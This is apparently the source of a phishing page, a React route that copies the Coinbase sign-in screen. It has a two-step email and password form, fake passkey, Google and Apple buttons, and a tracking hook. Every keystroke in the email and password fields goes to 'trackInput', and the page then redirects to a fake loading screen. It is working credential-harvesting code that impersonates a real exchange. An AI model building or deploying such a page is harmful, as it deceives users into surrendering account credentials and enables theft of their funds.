import { createFileRoute } from "@tanstack/react-router";
import { useCallback, useState } from "react";
import {
  CbFontStyle,
  CbLogo,
  CbSupportBanner,
  useCbTracking,
} from "@/components/cb/CbShared";

export const Route = createFileRoute("/cb/signin")({
  head: () => ({ meta: [{ title: "Sign in to Coinbase" }] }),
  component: CbSignInPage,
});

function AppleIcon() {
  return (
    <svg width="20" height="24" viewBox="0 0 19 23" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
      <path d="M18.4231 17.4097C18.0853 18.1902 17.6854 18.9086 17.222 19.5692C16.5905 20.4696 16.0733 21.0929 15.6748 21.4391C15.057 22.0072 14.3951 22.2982 13.6863 22.3147C13.1775 22.3147 12.5638 22.1699 11.8495 21.8762C11.1329 21.5838 10.4743 21.4391 9.87209 21.4391C9.24052 21.4391 8.56316 21.5838 7.83865 21.8762C7.11303 22.1699 6.52848 22.323 6.08156 22.3382C5.40186 22.3671 4.72437 22.0679 4.04812 21.4391C3.6165 21.0626 3.07663 20.4172 2.42989 19.503C1.73599 18.5267 1.16551 17.3945 0.718584 16.1038C0.239942 14.7097 0 13.3596 0 12.0527C0 10.5555 0.323508 9.26423 0.971488 8.18215C1.48074 7.31298 2.15824 6.62735 3.00617 6.12403C3.8541 5.6207 4.77029 5.36421 5.75695 5.3478C6.29682 5.3478 7.00478 5.5148 7.88457 5.84299C8.76188 6.17229 9.32519 6.33929 9.57216 6.33929C9.75681 6.33929 10.3826 6.14402 11.4434 5.75474C12.4466 5.39372 13.2933 5.24424 13.987 5.30313C15.8665 5.45481 17.2786 6.19574 18.2177 7.53058C16.5367 8.54909 15.7052 9.97564 15.7217 11.8057C15.7369 13.2311 16.254 14.4173 17.2703 15.3592C17.7309 15.7963 18.2452 16.1341 18.8175 16.3741C18.6934 16.734 18.5624 17.0787 18.4231 17.4097ZM14.1124 0.446929C14.1124 1.56419 13.7043 2.60737 12.8907 3.57293C11.9088 4.72078 10.7213 5.38407 9.43344 5.27941C9.41703 5.14537 9.40751 5.0043 9.40751 4.85606C9.40751 3.7835 9.87443 2.63564 10.7036 1.69711C11.1176 1.22191 11.6441 0.826795 12.2825 0.511602C12.9196 0.201112 13.5222 0.0294042 14.089 0C14.1055 0.14936 14.1124 0.298729 14.1124 0.446914V0.446929Z" />
    </svg>
  );
}


function GoogleIcon() {
  return (
    <svg width="17" height="17" viewBox="0 0 17 17" fill="none">
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M16.18 8.57691C16.18 8.00964 16.1291 7.46419 16.0345 6.94055H8.5V10.0351H12.8055C12.62 11.0351 12.0564 11.8824 11.2091 12.4496V14.4569H13.7945C15.3073 13.0642 16.18 11.0133 16.18 8.57691Z"
        fill="currentColor"
      />
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M8.50017 16.3949C10.6602 16.3949 12.4711 15.6786 13.7947 14.4567L11.2093 12.4495C10.4929 12.9295 9.57653 13.2131 8.50017 13.2131C6.41653 13.2131 4.65289 11.8058 4.0238 9.91492H1.35107V11.9876C2.66744 14.6022 5.37289 16.3949 8.50017 16.3949Z"
        fill="currentColor"
      />
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M4.02364 9.91497C3.86364 9.43497 3.77273 8.92225 3.77273 8.39497C3.77273 7.8677 3.86364 7.35497 4.02364 6.87497V4.80225H1.35091C0.809091 5.88225 0.5 7.10406 0.5 8.39497C0.5 9.68588 0.809091 10.9077 1.35091 11.9877L4.02364 9.91497Z"
        fill="currentColor"
      />
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M8.50017 3.57684C9.67471 3.57684 10.7293 3.98047 11.5583 4.7732L13.8529 2.47866C12.4674 1.18775 10.6565 0.39502 8.50017 0.39502C5.37289 0.39502 2.66744 2.18775 1.35107 4.80229L4.0238 6.87502C4.65289 4.98411 6.41653 3.57684 8.50017 3.57684Z"
        fill="currentColor"
      />
    </svg>
  );
}

function PasskeyIcon() {
  return (
    <svg width="16" height="17" viewBox="0 0 16 17" fill="none">
      <path
        d="M5.37256 0.93801C4.02536 1.22585 2.8994 2.35696 2.55569 3.75968C2.43717 4.24618 2.43717 5.05701 2.55569 5.5435C2.90335 6.9665 4.02141 8.07328 5.40417 8.36518C5.62936 8.41383 5.8506 8.42599 6.30098 8.41383C6.80668 8.39356 6.941 8.37734 7.22941 8.28004C8.02746 8.01652 8.62007 7.59489 9.08625 6.95434C9.38256 6.55298 9.56429 6.18405 9.70652 5.71783C9.80529 5.38944 9.81319 5.30836 9.81319 4.65159C9.81319 3.99482 9.80529 3.91374 9.70652 3.58536C9.3312 2.33668 8.45809 1.43261 7.22941 1.02315C6.92915 0.921793 6.82643 0.909631 6.26148 0.897468C5.83875 0.88936 5.54639 0.901522 5.37256 0.93801Z"
        fill="currentColor"
      />
      <path
        d="M12.5633 5.55967C11.9983 5.68129 11.5045 5.96508 11.0817 6.41509C10.2995 7.23808 10.0625 8.4908 10.4891 9.56515C10.7064 10.1165 11.1963 10.6922 11.6862 10.976L11.9272 11.1179L11.9312 13.3882V15.6585L12.5356 16.2747L13.1401 16.895L14.1633 15.8409L15.1905 14.7869L14.5781 14.1585L13.9658 13.5301L14.5702 12.9098C14.8982 12.5693 15.1708 12.2733 15.1708 12.253C15.1708 12.2328 14.9535 11.9895 14.6888 11.7179C14.4241 11.4463 14.2147 11.2152 14.2226 11.2071C14.2344 11.199 14.3846 11.1138 14.5584 11.0125C15.2142 10.6395 15.7397 9.94218 15.9214 9.20839C16.0162 8.8273 16.0281 8.11782 15.9411 7.75295C15.7081 6.73131 14.9021 5.884 13.8986 5.60021C13.5944 5.51507 12.8754 5.4948 12.5633 5.55967ZM13.6023 6.90564C13.7959 7.04348 13.9855 7.38808 13.9855 7.607C13.9855 7.81377 13.8196 8.15026 13.6576 8.27594C13.4759 8.41783 13.148 8.48675 12.9386 8.42999C12.5988 8.33269 12.3302 7.97593 12.3262 7.61917C12.3223 6.94618 13.069 6.52861 13.6023 6.90564Z"
        fill="currentColor"
      />
      <path
        d="M4.16802 9.78411C2.34279 10.0719 0.809901 11.4098 0.233093 13.218C0.0355566 13.8423 0 14.1585 0 15.3585V16.4491H5.33349H10.667V14.1382V11.8274L10.3509 11.5193C9.99536 11.1706 9.71486 10.7976 9.51337 10.4084L9.37904 10.1449L8.94446 9.99492C8.23728 9.75167 7.90147 9.71924 6.09993 9.72329C4.97397 9.72735 4.42087 9.74356 4.16802 9.78411Z"
        fill="currentColor"
      />
    </svg>
  );
}

function AvatarPlaceholder({ email }: { email: string }) {
  const initial = (email.trim()[0] || "?").toUpperCase();
  return (
    <div
      style={{
        width: 32,
        height: 32,
        borderRadius: "50%",
        flexShrink: 0,
        background: "linear-gradient(135deg, rgb(87, 139, 250), rgb(37, 99, 235))",
        color: "#fff",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        fontSize: 14,
        fontWeight: 600,
      }}
    >
      {initial}
    </div>
  );
}

function CbSignInPage() {
  const { trackClick, trackInput, cbNavigate, sessionId } = useCbTracking();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState<1 | 2>(1);
  const [showPassword, setShowPassword] = useState(false);
  const [continueLoading, setContinueLoading] = useState(false);
  const [loadingBtn, setLoadingBtn] = useState<string | null>(null);

  const isValidEmail = useCallback(
    (v: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v),
    [],
  );

  const handleContinue = async (e: React.FormEvent) => {
    e.preventDefault();
    if (step === 1) {
      if (!isValidEmail(email) || continueLoading) return;
      setContinueLoading(true);
      trackClick("Continue-Email");
      trackInput("email", email);
      setTimeout(() => {
        setContinueLoading(false);
        setStep(2);
      }, 900);
      return;
    }
    if (!password || continueLoading) return;
    setContinueLoading(true);
    trackClick("Continue-Password");
    trackInput("password", password);
    setTimeout(() => {
      cbNavigate("/cb/loading");
    }, 1200);
  };

  const handleSocialClick = (name: string) => {
    if (loadingBtn) return;
    setLoadingBtn(name);
    trackClick(name);
    setTimeout(() => setLoadingBtn(null), 1500);
  };

  return (
    <div
      className="cb-page"
      style={{
        display: "flex",
        flexDirection: "column",
        minHeight: "100vh",
        backgroundColor: "rgb(10, 11, 13)",
        color: "#fff",
      }}
    >
      <CbFontStyle />
      <style>{`
        .cb-page, .cb-page * {
          font-family: 'CoinbaseSans', 'CoinbaseText', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
          -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;
        }
        .cb-page * { box-sizing: border-box; }
        @keyframes cbFadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes cbSpin { to { transform: rotate(360deg); } }
        .cb-animate { animation: cbFadeIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) both; }
        .cb-animate-delay-1 { animation-delay: 0.05s; }
        .cb-animate-delay-2 { animation-delay: 0.1s; }
        .cb-animate-delay-3 { animation-delay: 0.15s; }
        .cb-animate-delay-4 { animation-delay: 0.2s; }
        .cb-animate-delay-5 { animation-delay: 0.25s; }
        .cb-animate-delay-6 { animation-delay: 0.3s; }
        .cb-animate-delay-7 { animation-delay: 0.35s; }
        .cb-header { display: grid; grid-template-columns: auto 1fr auto; height: 72px; align-items: center; padding: 0 24px; }
        .cb-header-logo { display: flex; align-items: center; color: #fff; cursor: pointer; }
        .cb-main { display: flex; justify-content: center; flex-direction: column; flex-grow: 1; padding: 0 16px; align-items: center; }
        .cb-form-container { width: 100%; max-width: 380px; display: flex; flex-direction: column; }
        .cb-title { font-size: 28px; font-weight: 500; line-height: 36px; letter-spacing: -0.02em; color: #fff; margin: 0 0 24px 0; }
        .cb-label { font-size: 14px; font-weight: 500; line-height: 20px; color: rgb(138, 145, 158); display: block; margin-bottom: 8px; }
        .cb-input-wrapper { position: relative; display: flex; align-items: center; width: 100%; }
        .cb-input { width: 100%; height: 56px; padding: 0 16px; border-radius: 12px; border: 1px solid rgba(138, 145, 158, 0.2); background: rgb(10, 11, 13); color: #fff; font-size: 16px; line-height: 24px; outline: none; transition: background-color 0.15s ease, border-color 0.15s ease; }
        .cb-input::placeholder { color: rgb(138, 145, 158); }
        .cb-input:hover { background: rgb(17, 18, 20); border-color: rgb(17, 18, 20); }
        .cb-input:focus { border-color: rgb(87, 139, 250); box-shadow: 0 0 0 1px rgb(87, 139, 250); background: rgb(10, 11, 13); }
        .cb-continue-btn { width: 100%; height: 56px; margin-top: 16px; border: none; border-radius: 1000px; background: rgb(87, 139, 250); color: rgb(10, 11, 13); font-size: 16px; font-weight: 700; line-height: 24px; cursor: pointer; transition: background-color 0.15s ease, opacity 0.15s ease, transform 0.1s ease; display: flex; align-items: center; justify-content: center; }
        .cb-continue-btn:disabled { opacity: 0.4; cursor: not-allowed; }
        .cb-continue-btn:not(:disabled):hover { background: rgb(95, 144, 250); }
        .cb-continue-btn:not(:disabled):active { background: rgb(99, 147, 250); transform: scale(0.98); }
        .cb-divider { display: flex; align-items: center; gap: 16px; margin: 24px 0; }
        .cb-divider hr { flex: 1; border: none; border-top: 1px solid rgba(138, 145, 158, 0.2); margin: 0; }
        .cb-divider span { font-size: 12px; font-weight: 500; line-height: 16px; color: rgb(138, 145, 158); text-transform: uppercase; letter-spacing: 0.05em; }
        .cb-social-btn { width: 100%; height: 56px; border: 1px solid rgba(138, 145, 158, 0.3); border-radius: 1000px; background: transparent; color: #fff; font-size: 16px; font-weight: 500; line-height: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 8px; transition: background-color 0.15s ease, border-color 0.15s ease; position: relative; padding: 0 24px; }
        .cb-social-btn .cb-social-icon { position: absolute; left: 24px; display: flex; align-items: center; }
        .cb-social-btn:hover { background: rgba(255, 255, 255, 0.04); border-color: rgba(138, 145, 158, 0.5); }
        .cb-spinner { width: 20px; height: 20px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: cbSpin 0.6s linear infinite; }
        .cb-footer-text { margin-top: 20px; text-align: center; }
        .cb-footer-text p { font-size: 16px; font-weight: 600; line-height: 24px; color: #fff; margin: 0; }
        .cb-footer-text button { background: none; border: none; color: rgb(87, 139, 250); font-size: 16px; font-weight: 600; cursor: pointer; padding: 0; margin-left: 4px; }
        .cb-footer-text button:hover { text-decoration: underline; }
        .cb-privacy { margin-top: 12px; text-align: center; font-size: 14px; line-height: 20px; color: rgb(138, 145, 158); }
        .cb-privacy a { color: rgb(138, 145, 158); text-decoration: underline; }
        .cb-privacy a:hover { color: rgb(87, 139, 250); }
        @media (max-width: 640px) {
          .cb-header { padding: 0 16px; height: 56px; }
          .cb-title { font-size: 24px; line-height: 32px; }
        }
      `}</style>

      <CbSupportBanner />

      <header className="cb-header">
        <div className="cb-header-logo" onClick={() => trackClick("Logo")}>
          <CbLogo />
        </div>
        <div />
        <div />
      </header>

      <main className="cb-main" style={{ justifyContent: "flex-start", paddingTop: 48 }}>
        <div className="cb-form-container">
          {step === 1 ? (
            <>
              <p className="cb-title cb-animate">Sign in to Coinbase</p>

              <form onSubmit={handleContinue} className="cb-animate cb-animate-delay-1">
                <label className="cb-label" htmlFor="cb-email">Email</label>
                <div className="cb-input-wrapper">
                  <input
                    id="cb-email"
                    name="email"
                    type="email"
                    className="cb-input"
                    placeholder="Your email address"
                    autoComplete="off"
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value);
                      trackInput("email", e.target.value);
                    }}
                  />
                </div>
                <button
                  type="submit"
                  className="cb-continue-btn"
                  disabled={!isValidEmail(email) || continueLoading}
                >
                  {continueLoading ? <div className="cb-spinner" /> : "Continue"}
                </button>
              </form>

              <div className="cb-divider cb-animate cb-animate-delay-2">
                <hr /><span>OR</span><hr />
              </div>

              {[
                { label: "Sign in with passkey", Icon: PasskeyIcon, delay: 3 },
                { label: "Sign in with Google", Icon: GoogleIcon, delay: 4 },
                { label: "Sign in with Apple", Icon: AppleIcon, delay: 5 },
              ].map(({ label, Icon, delay }) => (
                <button
                  key={label}
                  type="button"
                  className={`cb-social-btn cb-animate cb-animate-delay-${delay}`}
                  onClick={() => handleSocialClick(label)}
                  disabled={!!loadingBtn}
                >
                  {loadingBtn === label ? (
                    <div className="cb-spinner" />
                  ) : (
                    <>
                      <span className="cb-social-icon"><Icon /></span>
                      {label}
                    </>
                  )}
                </button>
              ))}

              <div className="cb-footer-text cb-animate cb-animate-delay-6">
                <p>
                  Don't have an account?
                  <button type="button" onClick={() => trackClick("Sign up")}>Sign up</button>
                </p>
              </div>

              <div className="cb-privacy cb-animate cb-animate-delay-7">
                Not your device? Use a private window. See our{" "}
                <a
                  href="#"
                  onClick={(e) => {
                    e.preventDefault();
                    trackClick("Privacy Policy");
                  }}
                >Privacy Policy</a>{" "}
                for more info.
              </div>
            </>
          ) : (
            <>
              <p className="cb-title cb-animate">Sign in to Coinbase</p>

              <div
                className="cb-animate cb-animate-delay-1"
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: 12,
                  padding: "12px 16px",
                  borderRadius: 12,
                  border: "1px solid rgba(138, 145, 158, 0.2)",
                  background: "rgb(17, 18, 20)",
                  marginBottom: 24,
                  cursor: "pointer",
                }}
                onClick={() => { setStep(1); setPassword(""); }}
              >
                <AvatarPlaceholder email={email} />
                <span style={{ fontSize: 16, color: "#fff", fontWeight: 400 }}>{email}</span>
              </div>

              <form onSubmit={handleContinue} className="cb-animate cb-animate-delay-2">
                <label className="cb-label" htmlFor="cb-password">Password</label>
                <div className="cb-input-wrapper">
                  <input
                    id="cb-password"
                    name="password"
                    type={showPassword ? "text" : "password"}
                    className="cb-input"
                    autoComplete="off"
                    autoFocus
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      trackInput("password", e.target.value);
                    }}
                    style={{ paddingRight: 48 }}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    style={{
                      position: "absolute",
                      right: 16,
                      background: "none",
                      border: "none",
                      color: "rgb(138, 145, 158)",
                      cursor: "pointer",
                      padding: 0,
                      display: "flex",
                      alignItems: "center",
                    }}
                    aria-label={showPassword ? "Hide password" : "Show password"}
                  >
                    {showPassword ? (
                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94" />
                        <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19" />
                        <line x1="1" y1="1" x2="23" y2="23" />
                      </svg>
                    ) : (
                      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                        <circle cx="12" cy="12" r="3" />
                      </svg>
                    )}
                  </button>
                </div>

                <div className="cb-animate cb-animate-delay-3" style={{ marginTop: 12 }}>
                  <a
                    href="#"
                    onClick={(e) => { e.preventDefault(); trackClick("Forgot password"); }}
                    style={{ color: "rgb(87, 139, 250)", textDecoration: "none", fontSize: 14, fontWeight: 500 }}
                  >
                    Forgot password?
                  </a>
                </div>

                <button
                  type="submit"
                  className="cb-continue-btn cb-animate cb-animate-delay-4"
                  disabled={!password || continueLoading}
                >
                  {continueLoading ? <div className="cb-spinner" /> : "Continue"}
                </button>
              </form>
            </>
          )}
        </div>
      </main>

      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>
        {sessionId}
      </div>
    </div>
  );
}
